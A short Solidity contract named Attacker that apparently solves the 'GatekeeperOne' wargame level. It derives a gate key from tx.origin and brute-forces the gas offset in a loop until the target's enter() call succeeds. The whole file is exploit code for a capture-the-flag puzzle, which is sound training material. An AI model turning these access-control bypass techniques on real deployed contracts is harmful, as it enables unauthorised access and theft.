// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Attacker {
    function ClaimEntrant(address _targetAddress) public returns (uint) {
        bool success = false;
        uint c = 1;

        GatekeeperOne target = GatekeeperOne(_targetAddress);
        uint32 lc = uint16(uint160(tx.origin));
        uint64 bc = 2**63;
        uint64 gateKey = bc + lc;
        while (!success) {
            try target.enter{gas: 8191*4+c}(bytes8(gateKey)) {
                success = true;
                return c;
            } catch {
                c++;
            }
            
        }
        return 0;
        
    }
}
